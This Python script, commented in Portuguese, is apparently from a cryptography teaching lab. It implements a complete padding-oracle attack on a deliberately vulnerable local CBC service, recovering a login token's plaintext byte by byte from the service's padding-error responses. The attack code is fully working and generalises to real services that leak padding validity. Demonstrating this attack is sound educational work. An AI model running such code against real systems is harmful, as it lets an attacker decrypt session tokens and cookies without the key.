"""
Ataque de padding oracle contra o servico CBC vulneravel.

O atacante nao conhece a chave. Ele so sabe que o endpoint /profile
responde com {"error": "padding invalido"} quando o padding PKCS#7 do
texto decifrado esta incorreto, e com outra resposta quando esta correto.

Usando esse unico bit de informacao (padding valido ou nao), e possivel
recuperar todo o texto original, bloco a bloco, byte a byte
(algoritmo classico de Vaudenay, 2002).

Rodar (com vulnerable/service.py ja rodando em outro terminal):
    python attacks/padding_oracle.py

Opcoes:
    python attacks/padding_oracle.py --base-url http://127.0.0.1:5000 --usuario ana
"""

from __future__ import annotations

import argparse
from collections.abc import Callable
from typing import Any

import requests

BLOCK_SIZE = 16
DEFAULT_BASE_URL = "http://127.0.0.1:5000"
DEFAULT_TIMEOUT = 5.0
DEFAULT_USUARIO = "ana"
PADDING_ERROR = "padding invalido"

Oracle = Callable[[bytes], bool]


class PaddingOracleClient:
    """Cliente HTTP com o oraculo de padding do servico vulneravel."""

    def __init__(self, base_url: str, timeout: float) -> None:
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.session = requests.Session()
        self.total_requests = 0

    def __enter__(self) -> PaddingOracleClient:
        return self

    def __exit__(self, *args: object) -> None:
        self.session.close()

    def login(self, usuario: str) -> bytes:
        """Faz login e devolve o token CBC em bytes."""
        response = self.session.post(
            f"{self.base_url}/login",
            json={"usuario": usuario},
            timeout=self.timeout,
        )
        response.raise_for_status()

        try:
            token_hex = response.json()["token"]
        except (KeyError, ValueError) as exc:
            raise RuntimeError(f"Resposta de login invalida: {response.text}") from exc

        try:
            return bytes.fromhex(token_hex)
        except ValueError as exc:
            raise RuntimeError("O token de login nao esta em hexadecimal") from exc

    def oracle(self, token: bytes) -> bool:
        """
        Retorna True se o padding estiver correto.

        Qualquer resposta que nao seja o erro exato de padding e tratada
        como falha de protocolo, para nao mascarar problemas do servidor.
        """
        self.total_requests += 1
        response = self.session.post(
            f"{self.base_url}/profile",
            json={"token": token.hex()},
            timeout=self.timeout,
        )

        if response.status_code == 200:
            return True

        try:
            payload: Any = response.json()
        except ValueError as exc:
            raise RuntimeError(
                f"Resposta do oraculo nao e JSON: {response.text}"
            ) from exc

        if not isinstance(payload, dict):
            raise RuntimeError(f"Resposta do oraculo inesperada: {payload!r}")

        if response.status_code == 400 and payload.get("error") == PADDING_ERROR:
            return False

        raise RuntimeError(
            f"Resposta inesperada do oraculo: {response.status_code} {payload}"
        )


def quebrar_bloco(c_anterior: bytes, c_alvo: bytes, oracle: Oracle) -> bytes:
    """
    Recupera o plaintext de um bloco de 16 bytes.

    c_alvo e o bloco que sera decifrado. c_anterior e o bloco usado no
    XOR do CBC, que pode ser o IV ou outro bloco de ciphertext.
    """
    if len(c_anterior) != BLOCK_SIZE or len(c_alvo) != BLOCK_SIZE:
        raise ValueError("Os blocos devem ter 16 bytes")

    intermediario = bytearray(BLOCK_SIZE)
    c_mod = bytearray(c_anterior)

    for pad_val in range(1, BLOCK_SIZE + 1):
        pos = BLOCK_SIZE - pad_val

        # Ajusta os bytes ja descobertos para manter o padding atual.
        for k in range(pos + 1, BLOCK_SIZE):
            c_mod[k] = intermediario[k] ^ pad_val

        for guess in range(256):
            c_mod[pos] = guess
            token_teste = bytes(c_mod) + bytes(c_alvo)

            if not oracle(token_teste):
                continue

            # No caso de padding de 1 byte, o plaintext original pode
            # terminar com um padding maior. Alterar o byte anterior
            # invalida esse caso e confirma o candidato correto.
            if pad_val == 1:
                c_check = bytearray(c_mod)
                c_check[pos - 1] ^= 0xFF
                if not oracle(bytes(c_check) + bytes(c_alvo)):
                    continue

            intermediario[pos] = guess ^ pad_val
            break
        else:
            raise RuntimeError(f"Nao foi possivel recuperar o byte na posicao {pos}")

    # plaintext do bloco = intermediario XOR bloco anterior original
    return bytes(a ^ b for a, b in zip(intermediario, c_anterior))


def quebrar_token(token: bytes, oracle: Oracle) -> bytes:
    """Quebra o token inteiro (IV + N blocos de ciphertext), bloco a bloco."""
    if len(token) < 2 * BLOCK_SIZE or len(token) % BLOCK_SIZE != 0:
        raise ValueError("Token CBC invalido")

    blocos = [token[i:i + BLOCK_SIZE] for i in range(0, len(token), BLOCK_SIZE)]
    total_blocos = len(blocos) - 1

    plaintext = b""
    for i in range(1, len(blocos)):
        print(f"    [*] Quebrando bloco {i} de {total_blocos}...")
        plaintext += quebrar_bloco(blocos[i - 1], blocos[i], oracle)

    pad_len = plaintext[-1]
    if not 1 <= pad_len <= BLOCK_SIZE:
        raise RuntimeError(f"Padding recuperado invalido: {pad_len}")
    if plaintext[-pad_len:] != bytes([pad_len]) * pad_len:
        raise RuntimeError("Padding PKCS#7 recuperado invalido")

    return plaintext[:-pad_len]


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Executa o ataque de padding oracle contra o servico CBC.",
    )
    parser.add_argument(
        "--base-url",
        default=DEFAULT_BASE_URL,
        help=f"URL do servico (padrao: {DEFAULT_BASE_URL})",
    )
    parser.add_argument(
        "--usuario",
        default=DEFAULT_USUARIO,
        help=f"Usuario usado no login (padrao: {DEFAULT_USUARIO})",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help=f"Timeout das requisicoes em segundos (padrao: {DEFAULT_TIMEOUT})",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)

    with PaddingOracleClient(args.base_url, args.timeout) as client:
        token = client.login(args.usuario)
        print(f"[1] Token capturado (interceptado, ex: de um cookie): {token.hex()}\n")

        print("[2] Iniciando quebra via padding oracle...")
        plaintext = quebrar_token(token, client.oracle)

        total_blocos = len(token) // BLOCK_SIZE - 1
        print("\n[3] Plaintext recuperado SEM conhecer a chave:")
        print(f"    {plaintext!r}")
        print(f"\n[4] Total de requisicoes ao oraculo: {client.total_requests}")
        print(
            "    (teorico, pior caso: ~256 x 16 x n_blocos = "
            f"{256 * BLOCK_SIZE * total_blocos})"
        )

    if not plaintext.startswith(b"admin=0;usuario="):
        print("\n[!] O plaintext recuperado nao tem o prefixo esperado.")
        return 1

    print("\n[SUCESSO] Plaintext recuperado sem conhecer a chave.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
